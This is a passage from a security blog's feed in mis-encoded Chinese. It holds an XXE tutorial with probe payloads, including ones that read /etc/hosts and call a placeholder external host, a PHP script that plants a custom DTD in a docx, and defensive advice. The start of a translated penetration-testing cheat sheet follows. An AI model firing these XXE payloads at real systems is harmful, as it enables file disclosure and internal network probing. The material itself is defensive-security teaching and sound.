ÔºåÂÜÖÂê´SSHÁôªÈôÜÂØÜÁ†Å orz„ÄÇ</li><li>‰∏Ä‰∫õÂÖ∂‰ªñÊ°à‰æã<ul><li><a href="https://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution" target="_blank" rel="noopener">XXE in OpenID: one bug to rule them all, or how I found a Remote Code Execution flaw affecting Facebook‚Äôs servers</a> „ÄêFacebook OpenIDÂäüËÉΩÁÇπÁöÑXRDS XXE„Äë<ul><li><a href="https://sensepost.com/blog/2014/revisting-xxe-and-abusing-protocols/" target="_blank" rel="noopener">Revisting XXE and abusing protocols</a> ÁöÑÂàÜÊûêËÄÖÂà©Áî®ËØ•ÂéüÁêÜÂú®ÂÖ∂‰ªñOpenIDÂπ≥Âè∞ÁªìÂêàexpectÊ®°ÂùóÂÆûÁé∞‰∫ÜRCE„ÄÇ</li></ul></li><li><a href="https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745" target="_blank" rel="noopener">XXE on Windows system ‚Ä¶then what ??</a> „ÄêXXE+SMB=&gt;ÂÜÖÁΩëRCE„Äë</li><li><a href="https://xz.aliyun.com/t/2448" target="_blank" rel="noopener">Apache Solr XXEÊºèÊ¥ûÂàÜÊûê -„ÄêCVE-2018-8026 „Äë</a> </li><li><a href="https://hackerone.com/reports/395296" target="_blank" rel="noopener">Phone Call to XXE via Interactive Voice Response</a> „ÄêÊâì‰∏™ÁîµËØù‰πüËÉΩXXE :)„Äë</li></ul></li></ul><h1 id="ÂèëÁé∞XXE"><a href="#ÂèëÁé∞XXE" class="headerlink" title="ÂèëÁé∞XXE"></a>ÂèëÁé∞XXE</h1><p>Â∞ùËØïÊ≥®ÂÖ•ÁâπÊÆäÂ≠óÁ¨¶Ôºå‰ΩøXMLÂ§±ÊïàÔºåÂºïÂèëËß£ÊûêÂºÇÂ∏∏ÔºåÊòéÁ°ÆÂêéÁ´Ø‰ΩøÁî®XML‰º†ËæìÊï∞ÊçÆ„ÄÇ</p><ul><li>ÂçïÂèåÂºïÂè∑ <code>&#39; &quot;</code> „ÄÇXMLÁöÑÂ±ûÊÄßÂÄºÂøÖÈ°ªÁî®ÂºïÂè∑ÂåÖË£πÔºåËÄåÊï∞ÊçÆÂèØËÉΩËøõÂÖ•Ê†áÁ≠æÁöÑÂ±ûÊÄßÂÄº„ÄÇ</li><li>Â∞ñÊã¨Âè∑<code>&lt; &gt;</code>„ÄÇXMLÁöÑÂºÄÂßã/ÁªìÊùüÊ†áÁ≠æÁî®Â∞ñÊã¨Âè∑ÂåÖË£πÔºåÊï∞ÊçÆ‰∏≠Âá∫Áé∞Â∞ñÊã¨Âè∑‰ºöÂºïÂèëÂºÇÂ∏∏„ÄÇ</li><li>Ê≥®ÈáäÁ¨¶ <code>&lt;!--</code> „ÄÇXML‰ΩøÁî® <code>&lt;!-- This is a comment --&gt;</code>  ‰ΩúÊ≥®Èáä„ÄÇ</li><li><code>&amp;</code> „ÄÇ&amp; Áî®‰∫éÂºïÁî®ÂÆû‰Ωì„ÄÇ</li><li>CDATA ÂàÜÈöîÁ¨¶<code>]]&gt;</code> „ÄÇ<code>&lt;![CDATA[foo]]&gt;</code> ‰∏≠ÁöÑÂÜÖÂÆπ‰∏çË¢´parserËß£ÊûêÔºåÊèêÂâçÈó≠ÂêàÂºïÂèëÂºÇÂ∏∏„ÄÇ</li></ul><p>Â∞ùËØïÂà©Áî®ÂÆû‰ΩìÂíåDTD„ÄÇ</p><ul><li>ÂºïÁî®Â§ñÈÉ®DTDÊñá‰ª∂ËÆøÈóÆÂÜÖÁΩë‰∏ªÊú∫/Á´ØÂè£„ÄÇ<code>&lt;!DOCTYPE a SYSTEM &quot;http://127.0.0.1:2333&quot;&gt;</code> ÔºàÁúãÂìçÂ∫îÊó∂Èó¥Ôºâ</li><li>ÂºïÁî®Â§ñÈÉ®DTDÊñá‰ª∂ËÆøÈóÆÂ§ñÁΩë„ÄÇ<code>&lt;!DOCTYPE a SYSTEM &quot;http://vps_ip&quot; &gt;</code></li><li>ÂºïÁî®ÂÜÖÈÉ®ÂÆû‰Ωì„ÄÇ<code>&lt;!DOCTYPE a [&lt;!ENTITY xxe &quot;findneo&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;</code></li><li>Â§ñÈÉ®ÂÆû‰ΩìËØªÊú¨Âú∞Êñá‰ª∂„ÄÇ<code>&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hosts&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;</code></li><li>Â§ñÈÉ®ÂÆû‰ΩìËÆøÈóÆÂÜÖÁΩë‰∏ªÊú∫/Á´ØÂè£„ÄÇ<code>&lt;!DOCTYPE a SYSTEM &quot;http://192.168.1.2:80&quot;&gt;</code>ÔºàÁúãÂìçÂ∫îÊó∂Èó¥Ôºâ</li><li>Â§ñÈÉ®ÂÆû‰ΩìËÆøÈóÆÂ§ñÁΩë„ÄÇ<code>&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM &quot;http://vps_ip&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;</code> </li><li>Âà§Êñ≠ÈóÆÈ¢òÂ≠òÂú®ÂèØ‰ª•OOBÊèêÂèñÊï∞ÊçÆ„ÄÇ</li></ul><h1 id="ÁîüÊàêÊÅ∂ÊÑèWordÊñáÊ°£"><a href="#ÁîüÊàêÊÅ∂ÊÑèWordÊñáÊ°£" class="headerlink" title="ÁîüÊàêÊÅ∂ÊÑèWordÊñáÊ°£"></a>ÁîüÊàêÊÅ∂ÊÑèWordÊñáÊ°£</h1><p>‰∏äÈù¢ÊèêÂà∞ÁöÑÂ§ö‰∏™Ê°à‰æãÈÉΩÈúÄË¶ÅÁî®Âà∞Ëá™ÂÆö‰πâDTDÁöÑdocxÊñá‰ª∂ÔºåÊúâ‰∏™Âêç‰∏∫ <a href="https://buer.haus/xxegen/" target="_blank" rel="noopener">XXEGen</a> ÁöÑÂú®Á∫øÁΩëÁ´ôÂèØ‰ª•Êñπ‰æøÂú∞ÁîüÊàêÂíåÁõëÂê¨Ôºà‰πüÂèØËá™ÂÆö‰πâÁõëÂê¨Âú∞ÂùÄÔºâÔºå‰ªéËÄåÊñπ‰æøÂø´ÈÄüÂú∞ÊµãËØïXXEÊòØÂê¶Â≠òÂú®Ôºå‰ΩÜÁõÆÂâçÁúãÊù•Ëøò‰∏çÊîØÊåÅËá™ÂÆö‰πâDTDÔºåÂ¶ÇÊûúÈúÄË¶ÅÁî®Âà∞OOB‰πãÁ±ªÁöÑÊäÄÊúØÔºåÂèØËÉΩÂ∞±‰∏çÂ§™Êñπ‰æø„ÄÇ</p><p>ÊâÄ‰ª•ÊàëÂÜô‰∫Ü‰∏™Â∞èËÑöÊú¨ÔºåÂèØ‰ª•Áî®Êù•ÁîüÊàê‰∏Ä‰∏™Ê≠£Â∏∏docxÊñá‰ª∂ÔºåÁÑ∂ÂêéÊ≥®ÂÖ•Ëá™ÂÆö‰πâÁöÑDTDÂíåÂÆû‰ΩìÂºïÁî®„ÄÇÂè¶Â§ñÊñ∞ÁâàÁöÑwordËΩØ‰ª∂ÈªòËÆ§Á¶ÅÁî®DTDÔºåtrigger ÂáΩÊï∞ËøòÂèØ‰ª•Êú¨Âú∞ÊµãËØï‰∏ãwordÊñá‰ª∂ÊòØÂê¶ÊúâÈóÆÈ¢ò„ÄÇ</p><p>ÂÖ∂ÂÆû‰øÆÊîπ docx Êñá‰ª∂ÁöÑÂéüÁêÜÂæàÁÆÄÂçïÔºåÊâãÂä®‰πüÂèØ‰ª•ÂÅö„ÄÇËß£Âéã demo.docx Âà∞ demoÊñá‰ª∂Â§π ÔºåÁõ¥Êé•‰øÆÊîπ <code>demo/word/document.xml</code>  Êñá‰ª∂ÂÜÖÂÆπÔºåÂÖ®ÈÄâ demo Êñá‰ª∂Â§π‰∏≠ÁöÑÊñá‰ª∂Ôºå‰ΩøÁî® 7zip ÁöÑ‰ªÖÂ≠òÂÇ®ÊñπÂºèÂéãÁº©Êàê demo2.docx Âç≥ÂèØ„ÄÇ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// by https://github.com/findneo</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">genword</span><span class="params">($filename,$filecontent)</span></span>&#123;</span><br><span class="line">    $word = <span class="keyword">new</span> COM(<span class="string">"word.application"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to instantiate Word"</span>);</span><br><span class="line">    $word-&gt;Visible = <span class="number">0</span>;<span class="comment">//‰øùÊåÅÁ®ãÂ∫èÂú®ÂêéÂè∞ËøêË°å</span></span><br><span class="line">    $word-&gt;Documents-&gt;Add();<span class="comment">//Êñ∞Âª∫WordÊñáÊ°£</span></span><br><span class="line">    $word-&gt;Selection-&gt;TypeText($filecontent);<span class="comment">//ÂÜôÂÖ•ÊåáÂÆöÂÜÖÂÆπ</span></span><br><span class="line">    $word-&gt;Documents[<span class="number">1</span>]-&gt;SaveAs(getcwd().<span class="string">"/"</span>.$filename);<span class="comment">//‰øùÂ≠òÂà∞ÊåáÂÆöË∑ØÂæÑ</span></span><br><span class="line">    $word-&gt;Quit();<span class="comment">//ÈÄÄÂá∫Á®ãÂ∫è</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">poisonWord</span><span class="params">($filename,$flag,$dtd,$entity_reference)</span> </span>&#123;</span><br><span class="line">    $zip = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">    $zip-&gt;open($filename);</span><br><span class="line">    $xml=$zip-&gt;getFromName(<span class="string">'word/document.xml'</span>);</span><br><span class="line">    $prolog=<span class="string">'&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;'</span>;</span><br><span class="line">    $evilxml=str_replace([$prolog,$flag],[$prolog.$dtd,$flag.$entity_reference],$xml);<span class="comment">//ÊûÑÈÄ†ÊÅ∂ÊÑèXML</span></span><br><span class="line">    $zip-&gt;deleteName(<span class="string">'word/document.xml'</span>);</span><br><span class="line">    $zip-&gt;addFromString(<span class="string">"word/document.xml"</span>,$evilxml);<span class="comment">//Êõ¥Êñ∞docxÊñá‰ª∂</span></span><br><span class="line">    $zip-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $zip = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">    $zip-&gt;open($filename);</span><br><span class="line">    $xml=$zip-&gt;getFromName(<span class="string">'word/document.xml'</span>);</span><br><span class="line">    $doc_xml = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $doc_xml-&gt;loadXML($xml); <span class="comment">//Âä†ËΩΩwordÊñáÊ°£</span></span><br><span class="line">    $zip-&gt;close();</span><br><span class="line">    <span class="keyword">return</span> $doc_xml-&gt;textContent; <span class="comment">//ËØªÂèñÊñáÊ°£ÂÜÖÂÆπ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Âú®ËøôÈáåÂÆö‰πâÊÉ≥Ë¶ÅÊ∑ªÂä†ÁöÑDTDÂÜÖÂÆπÂíåÊÉ≥Ë¶ÅÂú®XML‰∏≠ÂºïÁî®ÁöÑÂÆû‰Ωì</span></span><br><span class="line">$dtd=<span class="string">'&lt;!DOCTYPE ANY [&lt;!ENTITY xxe  SYSTEM "http://127.0.0.1:8088/?findneo"&gt;&lt;!ENTITY int "XXE"&gt;]&gt;'</span>;</span><br><span class="line">$entity_reference=<span class="string">"&amp;xxe; &amp;int; IS EXCITING!"</span>;</span><br><span class="line"></span><br><span class="line">$name=<span class="string">"demo.docx"</span>;<span class="comment">//ÁîüÊàêÊñá‰ª∂ÁöÑÊñá‰ª∂Âêç</span></span><br><span class="line">$flag=<span class="string">"Across the Great Wall we can reach every corner in the world."</span>;<span class="comment">//Êñá‰ª∂ÂÜÖÂÆπÔºåÂÆû‰ΩìÂú®ËØ•ÂÜÖÂÆπÈôÑËøëÂºïÁî®„ÄÇ</span></span><br><span class="line">genWord($name,$flag);<span class="comment">//ÁîüÊàê‰∏Ä‰∏™ÊåáÂÆöÂÜÖÂÆπÂíåÊñá‰ª∂ÂêçÁöÑÊ≠£Â∏∏docxÊñá‰ª∂</span></span><br><span class="line">poisonWord($name,$flag,$dtd,$entity_reference);<span class="comment">//ÂêëÊ≠£Â∏∏Êñá‰ª∂Ê≥®ÂÖ•DTDÂíåÂÆû‰ΩìÂºïÁî®ÔºåÁîüÊàêÊÅ∂ÊÑèÊñá‰ª∂</span></span><br><span class="line"><span class="keyword">echo</span> trigger($name);<span class="comment">//Âä†ËΩΩÊñá‰ª∂ÔºåÊµãËØïÊïàÊûú</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Ëã•Á®ãÂ∫è‰∏çËÉΩÊ≠£Â∏∏ËøêË°åÔºåÂèØÂ∞ùËØïÂú® php.ini Êú´Â∞æÊ∑ªÂä†‰ª•‰∏ãË∑ØÂæÑ</span></span><br><span class="line"><span class="comment">//extension="php_com_dotnet.dll Ë∑ØÂæÑ"; extension="php_mbstring.dll Ë∑ØÂæÑ"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Ê≠§Â§ñÔºåGithubÈ°πÁõÆ <a href="https://github.com/BuffaloWill/oxml_xxe" target="_blank" rel="noopener"><strong>oxml_xxe</strong></a>  ÊîØÊåÅÊõ¥Â§öÊñá‰ª∂Á±ªÂûã„ÄÇ </p><h1 id="Èò≤Âæ°"><a href="#Èò≤Âæ°" class="headerlink" title="Èò≤Âæ°"></a>Èò≤Âæ°</h1><p>ÂΩªÂ∫ïÁ¶ÅÁî®DTDÊòØÊúÄÂ•ΩÁöÑÔºåÈÄÄ‰∏ÄÊ≠•ÔºåÁ¶ÅÁî®Â§ñÈÉ®ÂÆû‰Ωì/Â§ñÈÉ®DTD‰πüÂèØ‰ª•„ÄÇÂÖ∑‰ΩìÂèÇËÄÉ <a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Prevention_Cheat_Sheet" target="_blank" rel="noopener">XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a> „ÄÇ</p><ul><li>Á¶ÅÁî®Â§ñÈÉ®ÂÆû‰Ωì ( <a href="http://cn2.php.net/libxml_disable_entity_loader" target="_blank" rel="noopener">http://cn2.php.net/libxml_disable_entity_loader</a> Á≠â)<ul><li>ÂØπ‰∫éPHPÊù•ËØ¥ÔºåÂ∞ΩÁÆ°‰∏çÂêåÁéØÂ¢É‰∏ã<code>simplexml_load_string()</code> ÈªòËÆ§Ë°å‰∏∫Âπ∂‰∏ç‰∏ÄËá¥Ôºå‰ΩÜ‰∏∫‰∫ÜÂÆâÂÖ®Â∫îÂΩìÊÄªÊòØ<code>libxml_disable_entity_loader();</code> „ÄÇ </li></ul></li><li>Ê£ÄÈ™åÊï∞ÊçÆÊù•Ê∫êÔºåËøáÊª§Êï∞ÊçÆ</li></ul><p>PHPÂèäÂÖ∂‰ªñËØ≠Ë®ÄÊàñÊ°ÜÊû∂ÔºåÊòØÂê¶ÈªòËÆ§Ëß£ÊûêÂ§ñÈÉ®ÂÆû‰ΩìÔºåËß£ÊûêÊñπÂºèÂíåÂú®ÁâπÂÆöÂú∫ÊôØ‰∏ãÁöÑËß£ÊûêË°®Áé∞Ôºå‰∏éÂÖ∂‰ΩøÁî®ÁöÑ libxml2 ÁâàÊú¨ÊúâÂÖ≥ÔºàÂ¶ÇÊûúÊòØÂü∫‰∫élibxml2ÁöÑËØùÔºâÔºå‰πü‰∏éXMLËß£ÊûêÂô®ÂèäÂÖ∂ÈÖçÁΩÆÊúâÂÖ≥„ÄÇÂ∞±PHPËÄåË®ÄÔºå<code>libxml2 Version</code> ÂèØ‰ª•Âú®phpinfoÈáåÁúãÔºåÊú¨Êñá‰ΩøÁî®ÁöÑÊòØ<code>2.7.8</code> „ÄÇ</p><p>ËøôÂèØËÉΩÊòØ‰∏Ä‰∏™ËØØËß£ÁöÑÁªìÊûú„ÄÇ</p><blockquote><p>Âú®slimphp2‰∏≠ÔºåÂÆòÊñπÊòØÂØπËøôÂùóËøõË°å‰∏ÄÂÆöÂ§ÑÁêÜ‰∫ÜÔºà„ÄÇ„ÄÇ„ÄÇ‰∏Ä‰∫õ‰ª£Á†Å„ÄÇ„ÄÇ„ÄÇÔºâ‰∏çÁü•‰∏∫‰ΩïÂú®3.0ÁâàÊú¨‰∏≠ÂÆòÊñπÂ∞±Êó†ËßÜËøô‰∏™ÈóÆÈ¢ò‰∫Ü„ÄÇ ÊàëÁåúÂèØËÉΩÊúâ‰∏§‰∏™ÂéüÂõ†Ôºö </p><p>1.ÂÆòÊñπÊ≥®ÊÑèÂà∞‰∫ÜËøô‰∏™ÈóÆÈ¢òÔºå‰ΩÜËÆ§‰∏∫3.0ÁâàÊú¨ÈúÄÊ±ÇÁöÑphpÁâàÊú¨Âú®5.5‰ª•‰∏äÔºåËÄåÈîô‰ª•‰∏∫5.5‰ª•‰∏äÁöÑphpÂ∞±Â∑≤Áªè‰∏çÂ≠òÂú®XXEÁöÑÈöêÊÇ£‰∫Ü„ÄÇ‰ΩÜÂÆûÈôÖ‰∏äXMLÂ§ñÈÉ®ÂÆû‰ΩìÁöÑËß£ÊûêÔºåÂíåphpÁâàÊú¨Âπ∂Êó†ÂÖ≥Á≥ªÔºåËÄåÊòØÂíåÁºñËØëÊó∂ÁöÑlibxmlÂ∫ìÁâàÊú¨ÊúâÂÖ≥„ÄÇ</p><p>2.ÂÆòÊñπÂ∞öÊú™Ê≥®ÊÑèÂà∞Ëøô‰∏™ÈóÆÈ¢ò„ÄÇ</p><p>ÊÑüËßâÂâçËÄÖÁöÑÂèØËÉΩÊÄßËæÉÂ§ß„ÄÇ  </p><p>‚Äî‚Äî wooyun-2015-0156208</p></blockquote><p>ÂèØ‰ª•ÁªìÂêà <a href="http://www.xmlsoft.org/news.html" target="_blank" rel="noopener">change log</a> Âíå <a href="https://github.com/GNOME/libxml2/commits" target="_blank" rel="noopener">GitHub commit</a> ‰∫ÜËß£ libxml2 ÂêÑÁâàÊú¨ÂÖ∑‰ΩìÊîπÂä®„ÄÇ</p><p>ÂèØ‰ª•ÁúãÂà∞‰∏é‰∏ªÈ¢òËæÉÁõ∏ÂÖ≥ÁöÑÊúâÔºö</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v2<span class="number">.9</span><span class="number">.5</span>: Sep <span class="number">04</span> <span class="number">2017</span></span><br><span class="line">    Security:Detect infinite recursion in parameter entities (Nick Wellnhofer)</span><br><span class="line">    Prevent unwanted external entity reference</span><br><span class="line">v2<span class="number">.9</span><span class="number">.2</span>: Oct <span class="number">16</span> <span class="number">2014</span></span><br><span class="line">    Security:</span><br><span class="line">Fix <span class="keyword">for</span> CVE<span class="number">-2014</span><span class="number">-3660</span> billion laugh variant (Daniel Veillard),</span><br><span class="line">CVE<span class="number">-2014</span><span class="number">-0191</span> <span class="keyword">Do</span> not fetch external parameter entities (Daniel Veillard)</span><br><span class="line"><span class="number">2.9</span><span class="number">.1</span>: Apr <span class="number">19</span> <span class="number">2013</span></span><br><span class="line">    Activate detection of encoding in external subset</span><br><span class="line"><span class="number">2.9</span><span class="number">.0</span>: Sep <span class="number">11</span> <span class="number">2012</span></span><br><span class="line">    <span class="keyword">Do</span> not fetch external parsed entities</span><br></pre></td></tr></table></figure><h1 id="Êâ©Â±ïÈòÖËØª"><a href="#Êâ©Â±ïÈòÖËØª" class="headerlink" title="Êâ©Â±ïÈòÖËØª"></a>Êâ©Â±ïÈòÖËØª</h1><ul><li><a href="https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf" target="_blank" rel="noopener">XML Out-Of-Band Data Retrieval</a>  </li><li><a href="https://www.vsecurity.com//download/publications/XMLDTDEntityAttacks.pdf" target="_blank" rel="noopener">XMLDTDEntityAttacks.pdf</a> </li><li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE" target="_blank" rel="noopener">XML External Entity (XXE) Processing</a>_Processing) </li><li><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">Êú™Áü•ÊîªÁÑâÁü•Èò≤‚Äî‚ÄîXXEÊºèÊ¥ûÊîªÈò≤</a> </li><li><a href="https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html" target="_blank" rel="noopener">DTD Cheat Sheet</a> </li><li><a href="https://www.tutorialspoint.com/dtd/dtd_syntax.htm" target="_blank" rel="noopener">DTD - Syntax</a> </li><li><a href="https://phonexicum.github.io/infosec/xxe.html" target="_blank" rel="noopener">Information Security / infosec / XXE</a> </li><li><a href="https://gist.github.com/staaldraad/01415b990939494879b4" target="_blank" rel="noopener">XXE_payloads</a> </li><li><a href="https://www.w3schools.com/xml/xml_dtd_intro.asp" target="_blank" rel="noopener">DTD Tutorial</a> </li><li><a href="https://www.w3.org/TR/xml/" target="_blank" rel="noopener">Extensible Markup Language (XML) 1.0 (Fifth Edition)</a> </li><li><a href="https://msdn.microsoft.com/en-us/library/ms256483(v=vs.110" target="_blank" rel="noopener">about XML entity at msdn</a>.aspx)  </li><li>Spring MVC xmlÁªëÂÆöpojoÈÄ†ÊàêÁöÑXXE Ôºà‰πå‰∫ëpapers-1911Ôºâ</li><li>OracleÁõ≤Ê≥®ÁªìÂêàXXEÊºèÊ¥ûËøúÁ®ãËé∑ÂèñÊï∞ÊçÆÔºà‰πå‰∫ëpapers-6035Ôºâ</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;Êú¨ÊñáÂèëËá™ &lt;a href=&quot;https://xz.aliyun.com/t/2571&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ÂÖàÁü•Á§æÂå∫&lt;/a&gt; ÔºåËΩ¨ËΩΩËØ∑Ê≥®ÊòéÂá∫Â§Ñ„ÄÇ&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;Ôºà Ëøô‰∏™ÈóÆÈ¢òËµÑÊñôÂæàÂ§ö‰∫ÜÔºåÁªÜËäÇ‰πüÈ¢áÂ§öÔºå
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>„ÄêËØë„ÄëÊ∏óÈÄèÊµãËØïÂ∑•ÂÖ∑Â§áÂøòÂΩï</title>
    <link href="https://findneo.github.io/180727PenetrationTool/"/>
    <id>https://findneo.github.io/180727PenetrationTool/</id>
    <published>2018-07-25T07:01:56.000Z</published>
    <updated>2019-01-25T23:21:37.053Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ê∏óÈÄèÊµãËØïÂ∑•ÂÖ∑Â§áÂøòÂΩï"><a href="#Ê∏óÈÄèÊµãËØïÂ∑•ÂÖ∑Â§áÂøòÂΩï" class="headerlink" title="Ê∏óÈÄèÊµãËØïÂ∑•ÂÖ∑Â§áÂøòÂΩï"></a>Ê∏óÈÄèÊµãËØïÂ∑•ÂÖ∑Â§áÂøòÂΩï</h1><p><strong>Êú¨ÊñáÁøªËØëËá™ <a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/" target="_blank" rel="noopener">Penetration Testing Tools Cheat Sheet </a> ÔºåÈ¶ñÂèë<a href="https://xz.aliyun.com/t/2446" target="_blank" rel="noopener">ÂÖàÁü•Á§æÂå∫</a> ÔºåËΩ¨ËΩΩËØ∑Ê≥®ÊòéÈìæÊé•„ÄÇ</strong></p><h2 id="ÁÆÄ‰ªã"><a href="#ÁÆÄ‰ªã" class="headerlink" title="ÁÆÄ‰ªã"></a>ÁÆÄ‰ªã</h2><p>Ê∏óÈÄèÊµãËØïÂ∑•ÂÖ∑Â§áÂøòÂΩïËÆ∞ÂΩïÊ∏óÈÄèÊµãËØïÊó∂Â∏∏Áî®ÁöÑÂëΩ‰ª§ÔºåÊõ¥Ê∑±ÂÖ•ÁöÑ‰ø°ÊÅØÊé®ËçêÂèÇËÄÉÁâπÂÆöÂ∑•ÂÖ∑ÁöÑÂ∏ÆÂä©ÊñáÊ°£Êàñ <a href="https://highon.coffee/blog/" target="_blank" rel="noopener">Êú¨Á´ô</a> ÂÖ∂‰ªñÂ§áÂøòÂΩï„ÄÇ</p><p>Êú¨ÁõÆÂΩïÂÖ≥Ê≥®ÁΩëÁªúÂ∫ïÂ±ÇÁõ∏ÂÖ≥ÁöÑÊ∏óÈÄèÊµãËØïÔºåÈô§‰∫ÜÂ∞ëÈáèsqlmapÁöÑÂëΩ‰ª§Âíå‰∏Ä‰∫õWebÊúçÂä°Êûö‰∏æÂ§ñÔºåÂü∫Êú¨‰∏çÂåÖÂê´WebÂ∫îÁî®Ê∏óÈÄèÊµãËØïÁöÑÂÜÖÂÆπ„ÄÇÂÖ≥‰∫éWebÂ∫îÁî®ÊµãËØïÔºåÂª∫ËÆÆÂèÇËÄÉ„ÄäÈªëÂÆ¢ÊîªÈò≤ÊäÄÊúØÂÆùÂÖ∏„ÄãÔºåËøôÊú¨‰π¶‰∏çÁÆ°ÊòØÁî®‰Ωú‰∏ìÈó®Â≠¶‰π†ËøòÊòØÂèÇËÄÉÊâãÂÜåÈÉΩÊòØÂæàÊ£íÁöÑ„ÄÇ</p><p>Êñá‰∏≠Áº∫Êºè‰πãÂ§ÑÊ¨¢Ëøé <a href="https://twitter.com/Arr0way" target="_blank" rel="noopener">Êé®Áâπ</a> ÁßÅÊà≥„ÄÇ</p><h3 id="Êõ¥Êñ∞Êó•ÂøóÔºö"><a href="#Êõ¥Êñ∞Êó•ÂøóÔºö" class="headerlink" title="Êõ¥Êñ∞Êó•ÂøóÔºö"></a>Êõ¥Êñ∞Êó•ÂøóÔºö</h3><p>17/02/2017 ÔºöÊõ¥Êñ∞ÊñáÁ´†ÔºåÂ¢ûÂä†VPNÔºåDNSÈößÈÅìÔºåVLAN hoppingÔºàË∑≥Ë∑ÉÊîªÂáªÔºâ Á≠âÂÜÖÂÆπ„ÄÇ</p><h2 id="ÂºÄÂßãÂâç"><a href="#ÂºÄÂßãÂâç" class="headerlink" title="ÂºÄÂßãÂâç"></a>ÂºÄÂßãÂâç</h2><h3 id="ÁΩëÁªúÈÖçÁΩÆ"><a href="#ÁΩëÁªúÈÖçÁΩÆ" class="headerlink" title="ÁΩëÁªúÈÖçÁΩÆ"></a>ÁΩëÁªúÈÖçÁΩÆ</h3><h4 id="ËÆæÁΩÆIP-Âú∞ÂùÄ"><a href="#ËÆæÁΩÆIP-Âú∞ÂùÄ" class="headerlink" title="ËÆæÁΩÆIP Âú∞ÂùÄ"></a>ËÆæÁΩÆIP Âú∞ÂùÄ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 xxx.xxx.xxx.xxx/24</span><br></pre></td></tr></table></figure><h4 id="Â≠êÁΩëÂàíÂàÜ"><a href="#Â≠êÁΩëÂàíÂàÜ" class="headerlink" title="Â≠êÁΩëÂàíÂàÜ"></a>Â≠êÁΩëÂàíÂàÜ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipcalc xxx.xxx.xxx.xxx/24 </span><br><span class="line">ipcalc xxx.xxx.xxx.xxx 255.255.255.0</span><br></pre></td></tr></table></figure><h2 id="ÂÖ¨ÂºÄÊù•Ê∫êÊÉÖÊä•"><a href="#ÂÖ¨ÂºÄÊù•Ê∫êÊÉÖÊä•" class="headerlink" title="ÂÖ¨ÂºÄÊù•Ê∫êÊÉÖÊä•"></a>ÂÖ¨ÂºÄÊù•Ê∫êÊÉÖÊä•</h2><h3 id="Ë¢´Âä®‰ø°ÊÅØÊî∂ÈõÜ"><a href="#Ë¢´Âä®‰ø°ÊÅØÊî∂ÈõÜ" class="headerlink" title="Ë¢´Âä®‰ø°ÊÅØÊî∂ÈõÜ"></a>Ë¢´Âä®‰ø°ÊÅØÊî∂ÈõÜ</h3><h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><h5 id="WHOIS-Êûö‰∏æ"><a href="#WHOIS-Êûö‰∏æ" class="headerlink" title="WHOIS Êûö‰∏æ"></a>WHOIS Êûö‰∏æ</h5><figure 